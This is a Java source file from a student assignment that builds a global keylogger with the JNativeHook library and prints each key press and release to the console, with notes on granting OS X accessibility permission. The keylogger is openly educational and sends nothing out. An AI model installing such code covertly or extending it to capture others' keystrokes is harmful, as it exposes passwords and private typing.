/**
 * Derek Malikian
 * Programming Assigment 2
 * October, 8 2017
 * 
 * Write a software key-logger and test it while you fill out a web 
 * form or type in the contents of a document using your favorite 
 * document preparation software. 
 * 
 */


/*
 The JNativeHook.jar file has been integrated in the libs folder
 
 To enable accessibility for the OS X, go to system preferences 
 and choose security & privacy, privacy, accessibility, and choose 
 the box for eclipse to allow access to computer. 
 */

package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

	public static void main(String[] args) {
	
		// Global screen is used to represent the native screen area that java
		// does not usually have access to. Handles loading, unpacking, and 
		// communication with the native library.  Includes registering
		// and un-registering the native hook with the underlying operating
		// system and adding global keyboard and mouse listeners.
		
		try {
			
			//Enable the native hook, this will throw a NativeHookException
			// is specific operating system feature is unavailable or disabled.
			
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {		
			e.printStackTrace();
		}
		
		// Adds the specified native key listener to receive key events
		// from the native system. 
		
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
	}

	// NativeKeyEvent: an event which indicates that a keystroke occurred at a
	// global scope.  The event is passed to every NativeKeyListener object 
	// which has been registered to receive global key events.  Each
	// NativeKeyListener object will receive a NativeKeyEvent when the 
	// event occurs. 
	
	
	// Invoked when a key has been pressed
	// @param nativeEvent the native key event
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		//System.out.println(" " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	}
	
	// Invoked when a key has been released
	// @param nativeEvent the native key event

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

		
	}

	
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		
		
	}

}


